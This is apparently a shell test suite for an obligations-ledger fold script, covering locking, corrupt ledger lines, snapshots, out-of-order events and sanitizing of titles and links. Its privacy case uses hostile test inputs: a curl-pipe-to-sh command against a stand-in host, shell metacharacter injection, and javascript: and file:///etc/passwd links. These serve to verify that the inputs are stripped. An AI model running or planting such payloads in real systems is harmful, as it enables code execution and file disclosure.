#!/usr/bin/env sh
# harden.test.sh (harbor#1050) — the fixes to the obligations fold an adversarial review of #1081 asked for: the lock, a bad ledger
# line, bounded growth, a close that arrives before its open, the privacy of title and subject, an empty id, the dedupe key.
#
# THE RED-PROOFS ARE IN THE SUITE, as in surface.test.sh. Each fix is a case function that prints ok or what was wrong, and
# runs twice: against the real script (must print ok) and against a copy with the fix taken out (must not). A mutation that
# did not apply fails too, so a proof cannot pass for want of a change.
. "$(dirname "$0")/../../lib/core.sh"; t_init

BIN="$T_ROOT/bin/status-obligations.sh"; KINDS="$T_ROOT/CONTRACTS/obligation-kinds.tsv"
W="$T_TMP/w"; EV="$W/ev"; OB="$W/ob"; CACHE="$W/cache"; MUTD="$T_TMP/mut"; FHOME="$T_TMP/zed"; D=2026-10-06.jsonl
NOW=2026-10-06T02:00:00Z; N=0; LAST=""; FAULT=""; RETAIN=""; LGRACE=""; EMPTY='{}'
mkdir -p "$MUTD" "$FHOME"

fresh() { rm -rf "$W"; mkdir -p "$EV" "$OB" "$CACHE"; N=0; NOW=2026-10-06T02:00:00Z; }
evi() { # <id> <ts> <kind> <subject> [data-json] — a bus line with a chosen id
  printf '{"id":"%s","ts":"%s","src":"cli","kind":"%s","subject":"%s","repo":"harbor","cause":"","data":%s}\n' "$1" "$2" "$3" "$4" "${5:-$EMPTY}" >> "$EV/$D"
}
ev() { N=$((N + 1)); LAST="e$N"; evi "$LAST" "$@"; }   # <ts> <kind> <subject> [data-json]
evj() { # <kind> <subject> <title> [link] — through jq, so any text is a legal subject or title
  N=$((N + 1)); LAST="e$N"
  jq -n -c --arg id "$LAST" --arg kind "$1" --arg subj "$2" --arg title "$3" --arg link "${4:-}" \
    '{id: $id, ts: "2026-10-06T01:00:00Z", src: "cli", kind: $kind, subject: $subj, repo: "harbor", cause: "",
      data: ({title: $title} + (if $link == "" then {} else {link: $link} end))}' >> "$EV/$D"
}
ob() { # <script> <mode…> — the real or the broken script on this bus and this state, stdout and stderr together
  _s="$1"; shift
  env HOME="$FHOME" HARBOR_EVENT_DIR="$EV" HARBOR_OBLIGATION_DIR="$OB" HARBOR_CACHE_DIR="$CACHE" HARBOR_STATUS_OBLIGATION_NOW="$NOW" \
    HARBOR_STATUS_OBLIGATION_KINDS="$KINDS" HARBOR_STATUS_OBLIGATION_ON_OVERDUE=off ${FAULT:+HARBOR_STATUS_OBLIGATION_FAULT="$FAULT"} \
    ${RETAIN:+HARBOR_STATUS_OBLIGATION_RETAIN="$RETAIN"} ${LGRACE:+HARBOR_STATUS_OBLIGATION_LOCK_GRACE="$LGRACE"} sh "$_s" "$@" 2>&1
}
cur() { jq -r --arg id "$1" ".obligations[] | select(.id == \$id) | .$2" "$OB/current.json" 2>/dev/null; }
lines() { wc -l < "$OB/ledger.jsonl" 2>/dev/null | tr -d ' '; }
BAD=""
chk() { [ "$3" = "$2" ] || BAD="$BAD [$1: want '$2', got '$3']"; }
verdict() { printf '%s' "${BAD:-ok}"; BAD=""; }
farm() { rm -rf "$MUTD/rp"; mkdir -p "$MUTD/rp"; for _f in "$T_ROOT"/bin/*; do ln -s "$_f" "$MUTD/rp/$(basename "$_f")"; done; }
mutate() { # <file> <from> <to> — $MUTD/rp/<name> becomes a copy of <file> with the first <from> replaced
  _mf="$MUTD/rp/$(basename "$1")"; rm -f "$_mf"
  from="$2" to="$3" awk 'BEGIN { RS = "\001"; from = ENVIRON["from"]; to = ENVIRON["to"] } { i = index($0, from); if (i == 0) exit 3; printf "%s%s%s", substr($0, 1, i - 1), to, substr($0, i + length(from)) }' \
    "$1" > "$_mf" || { t_fail "mutation target not found in $(basename "$1"): $2"; return 1; }
  cmp -s "$1" "$_mf" && { t_fail "mutation changed nothing: $2"; return 1; }
  return 0
}
redproof() { # <label> <case function> <file> <from> <to> — the broken copy must not pass the case, and an unbroken copy must
  farm; rm -f "$MUTD/rp/$(basename "$3")"; cp "$3" "$MUTD/rp/$(basename "$3")"; _c="$("$2" "$MUTD/rp/$(basename "$3")")"
  [ "$_c" = ok ] || { t_fail "$1: the control copy, unbroken, fails the case: $_c"; return 0; }
  mutate "$3" "$4" "$5" || return 0
  _v="$("$2" "$MUTD/rp/$(basename "$3")")"
  [ "$_v" != ok ] && t_pass || t_fail "$1: the broken copy still passed"
}
has() { case "$1" in *"$2"*) echo yes ;; *) echo no ;; esac; }   # <text> <needle> -> yes|no
waitfor() { _i=0; while ! eval "$1" && [ "$_i" -lt 100 ]; do sleep 0.1; _i=$((_i + 1)); done; }

# ── #1 · the lock ────────────────────────────────────────────────────────────────────────────────────────────────
# Twelve folds over 200 events, eleven started once the first holds the lock, each holding what it read for three seconds: the ledger holds each transition once. LGRACE=0 takes the
# empty-pid rule out of play, so what is under test is that the lock and its owner are made in one step.
case_concurrent() { _x="$1"; LGRACE=0; FAULT=slow-read; fresh
  _i=0; while [ "$_i" -lt 200 ]; do _i=$((_i + 1)); ev 2026-10-06T01:00:00Z pr.opened "VytCepas/harbor#$_i"; done
  ( ob "$_x" fold >/dev/null ) &   # the first holds the lock; the rest start once it exists, so they meet it whatever the load
  waitfor '[ -L "$OB/.fold.lock" ] || [ -d "$OB/.fold.lock" ]'
  _j=1; while [ "$_j" -lt 12 ]; do _j=$((_j + 1)); ( ob "$_x" fold >/dev/null ) & done; wait
  chk "ledger lines" 200 "$(lines)"
  chk "unique transitions" 200 "$(jq -r '.event + "|" + .obligation + "|" + .to' "$OB/ledger.jsonl" | sort -u | wc -l | tr -d ' ')"
  chk "rows" 200 "$(jq '.obligations | length' "$OB/current.json")"
  verdict; }

case_lock_states() { _x="$1"
  # an owner-less lock (a directory, as an older run left it) is live while it is young
  fresh; ev 2026-10-06T01:00:00Z session.start S1; mkdir "$OB/.fold.lock"
  _o="$(ob "$_x" fold)"; _rc=$?
  chk "empty-pid lock: exit" 0 "$_rc"
  chk "empty-pid lock: nothing written" no "$([ -e "$OB/ledger.jsonl" ] && echo yes || echo no)"
  chk "empty-pid lock: said who holds it" yes "$(has "$_o" "holds")"
  # ... and taken over once it is older than the grace
  sleep 2; LGRACE=1; ob "$_x" fold >/dev/null; LGRACE=""
  chk "old empty-pid lock: taken over" open "$(cur session:S1 state)"
  # a live pid does not keep a lock past its age limit (a reused pid must not silence every later run)
  sleep 30 >/dev/null 2>&1 & _sp=$!; rm -rf "$OB/.fold.lock"; ln -s "$_sp" "$OB/.fold.lock"; touch -h -t 202001010000 "$OB/.fold.lock"
  ev 2026-10-06T01:05:00Z session.start S2; _o="$(ob "$_x" fold)"; kill "$_sp" 2>/dev/null; wait "$_sp" 2>/dev/null
  chk "old lock with a live pid: taken over" open "$(cur session:S2 state)"
  chk "old lock with a live pid: said so" yes "$(has "$_o" "taking over")"
  chk "the run released its own lock" no "$([ -L "$OB/.fold.lock" ] || [ -e "$OB/.fold.lock" ] && echo yes || echo no)"
  # a run drops only its own lock: another run took it over mid-flight, and that lock is still there when this one ends
  fresh; ev 2026-10-06T01:00:00Z session.start S1; sleep 30 >/dev/null 2>&1 & _sq=$!
  FAULT=lock-gap; ( ob "$_x" fold >/dev/null ) & _bg=$!; FAULT=""
  waitfor '[ -L "$OB/.fold.lock" ]'; rm -f "$OB/.fold.lock"; ln -s "$_sq" "$OB/.fold.lock"
  wait "$_bg"
  chk "another run's lock survives a run that lost its own" "$_sq" "$(readlink "$OB/.fold.lock" 2>/dev/null)"
  kill "$_sq" 2>/dev/null; wait "$_sq" 2>/dev/null
  verdict; }

t_section "#1 lock: taken with its owner in one step, a nameless owner is live until old, an old lock is taken over, a run drops only its own"
t_eq "twelve folds at once leave 200 unique transitions, none doubled" ok "$(case_concurrent "$BIN")"
t_eq "lock states: empty pid live then stale, old lock with a live pid, only its own lock released" ok "$(case_lock_states "$BIN")"
redproof "lock made before its owner is written" case_concurrent "$BIN" \
  'elif ln -s "$$" "$LOCK" 2>/dev/null; then' \
  'elif mkdir "$LOCK" 2>/dev/null && { ( sleep 3; printf "%s\n" "$$" > "$LOCK/pid" ) & }; then'
redproof "an empty pid counts as dead at once" case_lock_states "$BIN" \
  '[ "$_age" -lt "$LOCK_GRACE" ] || _why="names no owner' '_why="names no owner'
redproof "no age limit on a lock" case_lock_states "$BIN" 'if [ "$_age" -gt "$LOCK_MAX" ]; then _why="is' 'if false; then _why="is'
redproof "a run removes any lock at exit" case_lock_states "$BIN" \
  'release_lock() { [ "$(lock_pid)" != "$$" ] || rm -f "$LOCK"; }' 'release_lock() { rm -f "$LOCK"; }'

# The lock's age on three userlands (harbor#1115, with #1112's tripwire against a bare `stat -f` in bin/): GNU stat as Linux has it, the
# BSD stat this box has, and a stat that answers nothing, so only the perl fallback can age the lock. An old lock with a live pid is taken
# over only if its age was read; a lock whose age cannot be read is never taken, and the run says "cannot take".
. "$T_ROOT/tests/lib/linux-sim.sh"
case_lock_age() { _x="$1"; fresh; ev 2026-10-06T01:00:00Z session.start S1
  sleep 30 >/dev/null 2>&1 & _sp=$!; ln -s "$_sp" "$OB/.fold.lock"; touch -h -t 202001010000 "$OB/.fold.lock"
  _o="$(ob "$_x" fold)"; kill "$_sp" 2>/dev/null; wait "$_sp" 2>/dev/null
  chk "an old lock is taken over, so its age was read" open "$(cur session:S1 state)"
  chk "and the run says why" yes "$(has "$_o" "taking over")"
  verdict; }
GNUS="$T_TMP/gnustat"; gnu_stat_stub "$GNUS"
NOSTAT="$T_TMP/nostat"; mkdir -p "$NOSTAT"; printf '#!/bin/sh\nexit 1\n' > "$NOSTAT/stat"; chmod +x "$NOSTAT/stat"
lock_age_on() { PATH="$1:$PATH"; case_lock_age "$2"; }   # <stat dir> <script> — run in a $( ), so the PATH change is dropped with it
t_section "#2 the lock's age reads on BSD, on GNU, and with no stat at all"
t_eq "this userland's stat" ok "$(case_lock_age "$BIN")"
t_eq "GNU stat (its stat -f prints filesystem text and fails)" ok "$(lock_age_on "$GNUS" "$BIN")"
t_eq "no usable stat: the perl fallback ages it" ok "$(lock_age_on "$NOSTAT" "$BIN")"
case_lock_nostat() { lock_age_on "$NOSTAT" "$1"; }
redproof "lock age without the perl fallback" case_lock_nostat "$BIN" '_lm="$(perl -e' '_lm="$(false -e'
nobare() { sed -e 's/^[[:space:]]*#.*//' | grep -cE 'stat[[:space:]]+-f'; }   # <script on stdin> -> the lines of code holding a bare stat -f
t_eq "bin/status-obligations.sh has no bare stat -f in its code" 0 "$(nobare < "$BIN")"
t_eq "red-proof: the same check finds a planted call, and not one in a comment" 1 "$(printf 'x="$(stat -f %%m f)"\n# stat -f in prose\n' | nobare)"
# ── #2 · a bad ledger line ───────────────────────────────────────────────────────────────────────────────────────
case_corrupt() { _x="$1"
  fresh; ev 2026-10-06T01:00:00Z pr.opened VytCepas/harbor#1; ev 2026-10-06T01:01:00Z pr.opened VytCepas/harbor#2; ob "$_x" fold >/dev/null
  # one bad line in the middle of the ledger, read from the whole ledger (no snapshot)
  { sed -n 1p "$OB/ledger.jsonl"; echo garbage; sed -n '2,$p' "$OB/ledger.jsonl"; } > "$W/l.tmp" && mv "$W/l.tmp" "$OB/ledger.jsonl"; rm -f "$OB/snapshot.json"
  ev 2026-10-06T01:02:00Z pr.opened VytCepas/harbor#3; _o="$(ob "$_x" fold)"; _rc=$?
  chk "middle line: the fold exits" 0 "$_rc"
  chk "middle line: the new event was folded" open "$(cur pr:VytCepas/harbor#3 state)"
  chk "middle line: the rows before and after it survive" 3 "$(jq '.obligations | length' "$OB/current.json")"
  chk "middle line: warned on stderr" yes "$(has "$_o" "skipped 1 ledger line")"
  chk "middle line: the sources say so" false "$(ob "$_x" show --json 2>/dev/null | jq -r '.sources.ledger.ok')"
  # a bad line after the snapshot, in the tail
  printf 'not json\n' >> "$OB/ledger.jsonl"; ev 2026-10-06T01:03:00Z pr.opened VytCepas/harbor#4; _o="$(ob "$_x" fold)"; _rc=$?
  chk "tail line: the fold exits" 0 "$_rc"
  chk "tail line: the new event was folded" open "$(cur pr:VytCepas/harbor#4 state)"
  chk "tail line: warned" yes "$(has "$_o" "skipped 1 ledger line")"
  # and it is not warned about again once folded past
  ev 2026-10-06T01:04:00Z pr.opened VytCepas/harbor#5; _o="$(ob "$_x" fold)"
  chk "a clean run after it does not warn" no "$(has "$_o" "skipped")"
  chk "and the ledger source is gone again" null "$(jq -r '.ledger.ok' "$OB/sources.json" 2>/dev/null || echo null)"
  verdict; }

t_section "#2 a ledger line that does not parse is skipped and counted: it no longer wedges the fold"
t_eq "bad lines in the middle and in the tail: folded past, warned, shown as a source" ok "$(case_corrupt "$BIN")"
redproof "the ledger is read strictly" case_corrupt "$BIN" "jq -R -c 'fromjson? | select(type == \"object\" and (.obligation | type) == \"string\" and (.to | type)" "jq -R -c 'fromjson | select(type == \"object\" and (.obligation | type) == \"string\" and (.to | type)"
redproof "the skipped lines are not reported as a source" case_corrupt "$BIN" '  ledger_source
  surface_pass' '  surface_pass'

# ── #3 · bounded growth ──────────────────────────────────────────────────────────────────────────────────────────
case_retention() { _x="$1"; fresh; RETAIN=3600   # the window is one hour here: cut = 01:00 at a 02:00 clock
  ev 2026-10-06T00:00:00Z pr.opened VytCepas/harbor#1; ev 2026-10-06T00:10:00Z pr.merged VytCepas/harbor#1
  ev 2026-10-06T01:30:00Z pr.opened VytCepas/harbor#2; ev 2026-10-06T01:40:00Z pr.merged VytCepas/harbor#2
  ev 2026-10-06T01:50:00Z pr.opened VytCepas/harbor#3; ob "$_x" fold >/dev/null
  chk "current.json: live and recently closed rows only" "pr:VytCepas/harbor#2 pr:VytCepas/harbor#3" "$(jq -r '[.obligations[].id] | join(" ")' "$OB/current.json")"
  chk "the ledger keeps the old row's history" 5 "$(lines)"
  chk "the snapshot drops it too" 2 "$(jq '.state.rows | length' "$OB/snapshot.json")"
  verdict; }

# The fold reads the ledger from the snapshot's byte: the head is overwritten with a line of the same length that would not
# parse, and a run that read it would say so.
case_tail_only() { _x="$1"; fresh
  ev 2026-10-06T01:00:00Z pr.opened VytCepas/harbor#1; ev 2026-10-06T01:01:00Z pr.opened VytCepas/harbor#2; ob "$_x" fold >/dev/null
  _l1="$(sed -n 1p "$OB/ledger.jsonl")"; _g="$(awk -v n="${#_l1}" 'BEGIN { s = sprintf("%" n "s", ""); gsub(/ /, "x", s); print s }')"
  { printf '%s\n' "$_g"; sed -n '2,$p' "$OB/ledger.jsonl"; } > "$W/l.tmp" && mv "$W/l.tmp" "$OB/ledger.jsonl"
  ev 2026-10-06T01:02:00Z pr.opened VytCepas/harbor#3; _o="$(ob "$_x" fold)"
  chk "the new event is folded" open "$(cur pr:VytCepas/harbor#3 state)"
  chk "the ledger before the snapshot was not read" no "$(has "$_o" "skipped")"
  chk "the row it held survives from the snapshot" open "$(cur pr:VytCepas/harbor#1 state)"
  verdict; }

# A snapshot that is not this ledger's, or not a snapshot, is rebuilt from the whole ledger: same rows as a run that never had one.
case_snapshot_rebuild() { _x="$1"; fresh
  ev 2026-10-06T01:00:00Z pr.opened VytCepas/harbor#1; ev 2026-10-06T01:01:00Z pr.opened VytCepas/harbor#2; ob "$_x" fold >/dev/null
  head -n 1 "$OB/ledger.jsonl" > "$W/l.tmp" && mv "$W/l.tmp" "$OB/ledger.jsonl"   # a shorter ledger than the snapshot saw
  ev 2026-10-06T01:02:00Z pr.opened VytCepas/harbor#3; _o="$(ob "$_x" fold)"; _rc=$?
  chk "snapshot ahead of its ledger: exit" 0 "$_rc"
  chk "snapshot ahead of its ledger: said so" yes "$(has "$_o" "does not match")"
  chk "snapshot ahead of its ledger: rebuilt from the ledger" "pr:VytCepas/harbor#1 pr:VytCepas/harbor#3" "$(jq -r '[.obligations[].id] | join(" ")' "$OB/current.json")"
  printf 'not a snapshot' > "$OB/snapshot.json"; ev 2026-10-06T01:03:00Z pr.opened VytCepas/harbor#4; _o="$(ob "$_x" fold)"; _rc=$?
  chk "a corrupt snapshot: exit" 0 "$_rc"
  chk "a corrupt snapshot: rebuilt" 3 "$(jq '.obligations | length' "$OB/current.json")"
  verdict; }

# Folding with a snapshot and folding without one end in the same ledger and the same rows.
case_snapshot_equal() { _x="$1"
  for _m in with without; do
    fresh; ev 2026-10-06T01:00:00Z session.start S1; ev 2026-10-06T01:01:00Z tool.background.start S1:T1 '{"tool":"Monitor"}'
    ev 2026-10-06T01:02:00Z pr.opened VytCepas/harbor#9 '{"session_id":"S1"}'; ob "$_x" fold >/dev/null
    [ "$_m" = with ] || rm -f "$OB/snapshot.json"
    ev 2026-10-06T01:03:00Z pr.merged VytCepas/harbor#9; ev 2026-10-06T01:04:00Z session.stop S1; ev 2026-10-06T01:05:00Z agent.done A1
    ev 2026-10-06T01:06:00Z agent.spawn A1; ob "$_x" fold >/dev/null
    cp "$OB/ledger.jsonl" "$T_TMP/ledger.$_m"; jq -c .obligations "$OB/current.json" > "$T_TMP/current.$_m"
  done
  chk "same ledger" same "$(cmp -s "$T_TMP/ledger.with" "$T_TMP/ledger.without" && echo same || echo different)"
  chk "same rows" same "$(cmp -s "$T_TMP/current.with" "$T_TMP/current.without" && echo same || echo different)"
  verdict; }

# A run killed after its ledger and snapshot but before its offset replays the same lines and adds nothing.
case_resume() { _x="$1"; fresh
  ev 2026-10-06T01:00:00Z session.start S1; ev 2026-10-06T01:01:00Z tool.background.start S1:T1 '{"tool":"Monitor"}'; ev 2026-10-06T01:02:00Z pr.opened VytCepas/harbor#9
  ev 2026-10-06T01:03:00Z session.stop S1; FAULT=before-offset; ( ob "$_x" fold ) >/dev/null 2>&1; FAULT=""
  _a="$(lines)"; ob "$_x" fold >/dev/null
  chk "the replay after the kill adds no transition" "$_a" "$(lines)"
  chk "the row is as the unkilled run leaves it" abandoned "$(cur tool.background:S1:T1 state)"
  verdict; }

t_section "#3 growth: current.json is the live rows and the recently closed; the fold reads the ledger from the snapshot on"
t_eq "rows closed before the window leave current.json and the snapshot, not the ledger" ok "$(case_retention "$BIN")"
t_eq "the ledger before the snapshot is not read" ok "$(case_tail_only "$BIN")"
t_eq "a snapshot that does not match its ledger, or is not one, is rebuilt" ok "$(case_snapshot_rebuild "$BIN")"
t_eq "with a snapshot or without, the same ledger and rows" ok "$(case_snapshot_equal "$BIN")"
t_eq "a kill after the snapshot, before the offset, replays to nothing new" ok "$(case_resume "$BIN")"
redproof "a closed row is kept for ever" case_retention "$BIN" \
  '  | .rows |= del(.[] | select(((.state | live) or ts_e(.closed_ts) >= $cut) | not))' ''
redproof "the whole ledger is read every run" case_tail_only "$BIN" 'if [ "$_lb" -le "$_size" ] && {' 'if false && {'
redproof "a snapshot is trusted whatever its ledger" case_snapshot_rebuild "$BIN" 'if [ "$_lb" -le "$_size" ] && {' 'if true || {'
redproof "the snapshot forgets the keys it applied" case_resume "$BIN" '{rows: .rows, seen: .seen, pending: .pending}' '{rows: .rows, seen: {}, pending: .pending}'

# ── #4 · a close that arrives before its open ────────────────────────────────────────────────────────────────────
case_pending() { _x="$1"
  fresh; ev 2026-10-06T01:10:00Z agent.done A1; _d="$LAST"; ev 2026-10-06T01:00:00Z agent.spawn A1; ob "$_x" fold >/dev/null
  chk "same run: the row is closed" closed "$(cur agent:A1 state)"
  chk "same run: by the terminal event" "$_d" "$(cur agent:A1 closed_by)"
  chk "same run: at its ts" 2026-10-06T01:10:00Z "$(cur agent:A1 closed_ts)"
  cp "$OB/ledger.jsonl" "$W/ledger.1"; rm -f "$OB/offset"; ob "$_x" fold >/dev/null
  chk "a replay from offset 0 adds nothing" same "$(cmp -s "$OB/ledger.jsonl" "$W/ledger.1" && echo same || echo different)"
  # the close and the open in different runs: the held close outlives the run
  fresh; ev 2026-10-06T01:10:00Z agent.done A2; ob "$_x" fold >/dev/null
  chk "close alone: no row" "" "$(cur agent:A2 state)"
  ev 2026-10-06T01:00:00Z agent.spawn A2; ob "$_x" fold >/dev/null
  chk "the open in a later run: closed" closed "$(cur agent:A2 state)"
  # a close older than the open belongs to an earlier life of the id: the row stays open
  fresh; ev 2026-10-06T01:00:00Z agent.done A3; ev 2026-10-06T01:30:00Z agent.spawn A3; ob "$_x" fold >/dev/null
  chk "a close older than the open is not applied" open "$(cur agent:A3 state)"
  verdict; }

t_section "#4 a terminal event that arrives before its start is applied when the start arrives"
t_eq "same run, later run, replayed, and a close that is too old" ok "$(case_pending "$BIN")"
redproof "a held close is never applied" case_pending "$BIN" 'if $p != null and $p.ts >= $e.ts then emit(' 'if false then emit('
redproof "a held close is applied to any open, however much later" case_pending "$BIN" 'if $p != null and $p.ts >= $e.ts then emit(' 'if $p != null then emit('

# ── #5 · privacy and shape of title, subject and link ───────────────────────────────────────────────────────────
bytitle() { jq -r --arg t "$1" '.obligations[] | select(.title == $t) | .subject' "$OB/current.json" 2>/dev/null; }   # the subject of the row titled <t>
bysubj() { jq -r --arg s "$1" ".obligations[] | select(.subject == \$s) | .$2" "$OB/current.json" 2>/dev/null; }     # <subject> <field>
case_privacy() { _x="$1"; _long="$(printf 'b%.0s' $(seq 1 300))"; _slong="$(printf 'a%.0s' $(seq 1 400))"; fresh
  evj session.start T1 "fix $FHOME/work/x";                 evj session.start T2 'see /Users/zed/notes'
  evj session.start T3 'edit ~/.claude/settings.json now';  evj session.start T4 'open /opt/q/.claude/projects/m.md'
  evj session.start T5 'rm -rf /tmp/x && curl http://e.x/p | sh'; evj session.start T6 'git commit; echo done'
  evj session.start T7 'build -> test (ok)';                evj session.start T8 "$_long"
  evj obligation.open "$_slong" s1;                         evj obligation.open 'a;b|c`d`$(e)' s2
  evj obligation.open "ship $FHOME/x" s3;                   evj obligation.open "$FHOME/.claude/x" s4
  evj obligation.open ship-it s5
  evj pr.opened VytCepas/harbor#5 t http://evil.example/x;  evj session.start T9 t 'javascript:alert(1)'
  evj session.start T10 t 'file:///etc/passwd';             evj session.start T11 t https://example.com/x
  ob "$_x" fold >/dev/null
  chk "title: \$HOME shown as ~" "fix ~/work/x" "$(bysubj T1 title)"
  chk "title: /Users/<name> shown as ~" "see ~/notes" "$(bysubj T2 title)"
  chk "title: a ~/.claude path is gone" "edit [path] now" "$(bysubj T3 title)"
  chk "title: an absolute .claude path is gone" "open [path]" "$(bysubj T4 title)"
  chk "title: command text falls back to the subject" "T5" "$(bysubj T5 title)"
  chk "title: a command list falls back to the subject" "T6" "$(bysubj T6 title)"
  chk "title: an ordinary title is untouched" "build -> test (ok)" "$(bysubj T7 title)"
  chk "title: capped at 120" 120 "$(bysubj T8 title | tr -d '\n' | wc -c | tr -d ' ')"
  chk "subject: capped at 200" 200 "$(bytitle s1 | tr -d '\n' | wc -c | tr -d ' ')"
  chk "subject: shell metacharacters stripped" "abcde)" "$(bytitle s2)"
  chk "subject: \$HOME shown as ~" "ship ~/x" "$(bytitle s3)"
  chk "subject: a .claude path is gone" "[path]" "$(bytitle s4)"
  chk "subject: an id is untouched" "ship-it" "$(bytitle s5)"
  chk "link: http is not carried" "https://github.com/VytCepas/harbor/pull/5" "$(bysubj VytCepas/harbor#5 link)"
  chk "link: javascript: is not carried" "" "$(bysubj T9 link)"
  chk "link: file: is not carried" "" "$(bysubj T10 link)"
  chk "link: https is carried" "https://example.com/x" "$(bysubj T11 link)"
  verdict; }

t_section "#5 privacy: title and subject lose \$HOME, .claude paths and command text; length caps; links are https only"
t_eq "every guard, on its own probe" ok "$(case_privacy "$BIN")"
redproof "the title cap is gone" case_privacy "$BIN" 'else $t[0:120] end' 'else $t end'
redproof "the subject cap is gone" case_privacy "$BIN" '| .[0:200];' ';'
redproof "any link scheme is carried" case_privacy "$BIN" 'startswith("https://")' 'length > 0'
redproof "\$HOME is not stripped" case_privacy "$BIN" '(if $home != "" then split($home) | join("~") else . end)' '.'
redproof "/Users/<name> is not stripped" case_privacy "$BIN" '  | gsub("/(Users|home)/[^/\\s]+"; "~")' ''
redproof "a .claude path is kept" case_privacy "$BIN" '  | gsub("[^\\s\"\u0027]*\\.claude(/[^\\s\"\u0027]*)?"; "[path]")' ''
redproof "command text is a title" case_privacy "$BIN" 'if ($t | length) == 0 or ($t | cmdlike) then $subj' 'if ($t | length) == 0 then $subj'
redproof "shell metacharacters stay in a subject" case_privacy "$BIN" ' | gsub("[;&|`<>\\\\]|\\$[({]"; "")' ''

# ── #6 · an empty id, the dedupe key ─────────────────────────────────────────────────────────────────────────────
case_empty_id() { _x="$1"; fresh
  evi "" 2026-10-06T01:00:00Z pr.opened VytCepas/harbor#1; evi "" 2026-10-06T01:01:00Z pr.merged VytCepas/harbor#1
  _o="$(ob "$_x" fold)"; _a="$(lines)"; rm -f "$OB/offset"; ob "$_x" fold >/dev/null
  chk "an event with no id is not an event" yes "$(has "$_o" "(0 events)")"
  chk "so a replay from offset 0 adds no line" "$_a" "$(lines)"
  verdict; }
case_key_has_to() { _x="$1"; fresh   # an open and a close that carry the same event id
  evi dup1 2026-10-06T01:00:00Z obligation.open ship-it; evi dup1 2026-10-06T01:05:00Z obligation.close ship-it; ob "$_x" fold >/dev/null
  chk "the close is not mistaken for the open's replay" closed "$(cur intent:ship-it state)"
  chk "both transitions are in the ledger" 2 "$(lines)"
  verdict; }

t_section "#6 an empty id is refused, and a close that shares its open's event id is still a close"
t_eq "a replay from offset 0 does not double rows for an id-less event" ok "$(case_empty_id "$BIN")"
t_eq "the dedupe key carries the transition" ok "$(case_key_has_to "$BIN")"
redproof "an empty id is accepted" case_empty_id "$BIN" ' and (.id | length) > 0' ''
redproof "the key is the event and the obligation only" case_key_has_to "$BIN" 'def key($t): $t.event + "|" + $t.obligation + "|" + $t.to;' 'def key($t): $t.event + "|" + $t.obligation;'

# ── #7 · noise (harbor#1049): `⧗N` is work to look at, not a census ──────────────────────────────────────────────
# Claude Code has no hook for a background tool finishing, so a background Bash row could only ever close at its 4h deadline or with
# its session: 144 of them read as ⧗149 on the live box. The register now opens a row only for the tools whose lifetime matters.
case_bg_noise() { _x="$1"; fresh
  ev 2026-10-06T01:00:00Z session.start S1; ev 2026-10-06T01:01:00Z pr.opened VytCepas/harbor#9 '{"session_id":"S1"}'
  ev 2026-10-06T01:02:00Z agent.spawn A1 '{"session_id":"S1"}'; ev 2026-10-06T01:03:00Z ci.job.start VytCepas/harbor:7:suites
  ev 2026-10-06T01:04:00Z tool.background.start S1:W1 '{"session_id":"S1","tool":"Workflow"}'
  ev 2026-10-06T01:05:00Z tool.background.start S1:M1 '{"session_id":"S1","tool":"Monitor"}'
  ev 2026-10-06T01:06:00Z tool.background.start S1:C1 '{"session_id":"S1","tool":"CronCreate"}'
  ev 2026-10-06T01:07:00Z tool.background.start S1:K1 '{"session_id":"S1","tool":"ScheduleWakeup"}'
  _i=0; while [ "$_i" -lt 144 ]; do _i=$((_i + 1)); ev 2026-10-06T01:10:00Z tool.background.start "S1:B$_i" '{"session_id":"S1","tool":"Bash"}'; done
  ev 2026-10-06T01:11:00Z tool.background.start S1:N1 '{"session_id":"S1"}'   # no tool named: not guessed at
  _o="$(ob "$_x" fold)"; _c="$CACHE/status-obligations.json"
  chk "the statusline counts what needs a look: session, PR, agent, CI run, Workflow, Monitor, CronCreate, ScheduleWakeup" 8 "$(jq '.live' "$_c" 2>/dev/null)"
  chk "a background Bash opens no row" "" "$(cur tool.background:S1:B1 state)"
  chk "nor does a start that names no tool" "" "$(cur tool.background:S1:N1 state)"
  chk "so 149 starts leave 8 rows, not 149" 8 "$(jq '.obligations | length' "$OB/current.json" 2>/dev/null)"
  chk "a Workflow still counts" open "$(cur tool.background:S1:W1 state)"
  chk "a Monitor still counts" open "$(cur tool.background:S1:M1 state)"
  chk "a ScheduleWakeup still counts" open "$(cur tool.background:S1:K1 state)"
  chk "the PR still counts" open "$(cur pr:VytCepas/harbor#9 state)"
  chk "the refused starts are counted, not silent" yes "$(has "$_o" "145 matched no register row")"
  verdict; }

t_section "#7 a background Bash opens no row, so ⧗N is not a census (harbor#1049)"
t_eq "149 starts, 8 rows, and every row worth a look is still there" ok "$(case_bg_noise "$BIN")"
redproof "the fold ignores opens_when" case_bg_noise "$BIN" ' and opens(.; $e))] | first) as $o' ')] | first) as $o'
KINDS_REAL="$KINDS"; KINDS="$T_TMP/kinds-oldbg.tsv"   # the control: the register as it was, a background Bash opening a row
awk 'BEGIN { FS = OFS = "\t" } $1 == "tool.background" { $9 = "-" } { print }' "$KINDS_REAL" > "$KINDS"
t_eq "the control register differs from the real one in exactly the tool.background row" 1 "$(diff "$KINDS_REAL" "$KINDS" | grep -c '^<')"
_old="$(case_bg_noise "$BIN")"
[ "$_old" != ok ] && t_pass || t_fail "CONTROL: under the old register the 149 starts still read ok"
t_eq "CONTROL: under the old register the statusline reads high (153 live)" yes "$(has "$_old" "want '8', got '153'")"
KINDS="$KINDS_REAL"

# opens_when is an anchored ERE over the WHOLE value: `Monitoring`, `XMonitorY` and `MonitorX` are not Monitor.
case_bg_anchor() { _x="$1"; fresh
  ev 2026-10-06T01:00:00Z tool.background.start S1:X1 '{"session_id":"S1","tool":"XMonitorY"}'
  ev 2026-10-06T01:00:00Z tool.background.start S1:X2 '{"session_id":"S1","tool":"Monitoring"}'
  ev 2026-10-06T01:00:00Z tool.background.start S1:X3 '{"session_id":"S1","tool":"MonitorX"}'
  ev 2026-10-06T01:00:00Z tool.background.start S1:X4 '{"session_id":"S1","tool":"XMonitor"}'
  ev 2026-10-06T01:00:00Z tool.background.start S1:X5 '{"session_id":"S1","tool":"Monitor Bash"}'
  ev 2026-10-06T01:00:00Z tool.background.start S1:OK '{"session_id":"S1","tool":"Monitor"}'
  ob "$_x" fold >/dev/null
  for _i in X1 X2 X3 X4 X5; do chk "tool near-miss $_i opens no row" "" "$(cur "tool.background:S1:$_i" state)"; done
  chk "the exact tool name still opens" open "$(cur tool.background:S1:OK state)"
  verdict; }

# A malformed opens_when (no key=) would otherwise be read as an empty pattern that matches every event: refused at validation.
